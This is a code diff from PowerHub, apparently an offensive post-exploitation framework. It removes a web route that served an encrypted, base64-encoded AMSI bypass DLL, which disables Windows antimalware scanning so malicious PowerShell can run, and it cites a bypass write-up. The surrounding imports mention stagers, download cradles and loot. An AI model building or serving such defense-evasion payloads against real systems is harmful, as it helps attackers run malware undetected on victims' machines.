@@ -20,7 +20,7 @@ from powerhub.sql import get_clipboard, init_db, decrypt_hive, get_loot, \
 from powerhub.stager import modules, build_cradle, callback_urls, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
-from powerhub.directories import UPLOAD_DIR, BASE_DIR, DB_FILENAME, \
+from powerhub.directories import UPLOAD_DIR, DB_FILENAME, \
         XDG_DATA_HOME
 from powerhub.tools import encrypt, compress, KEY
 from powerhub.auth import requires_auth
@@ -389,21 +389,6 @@ def hub_modules():
     ).encode()
     result = b64encode(encrypt((result), KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
-
-
-@app.route('/l')
-def payload_l():
-    """Load the AMSI Bypass DLL"""
-    # https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html  # noqa
-
-    if request.args['arch'] == 'x86':
-        filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
-    else:
-        filename = os.path.join(BASE_DIR, 'binary', 'amsi64.dll')
-    with open(filename, 'rb') as f:
-        DLL = f.read()
-    DLL = b64encode(encrypt(DLL, KEY))
-    return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
 @app.route('/dlcradle')
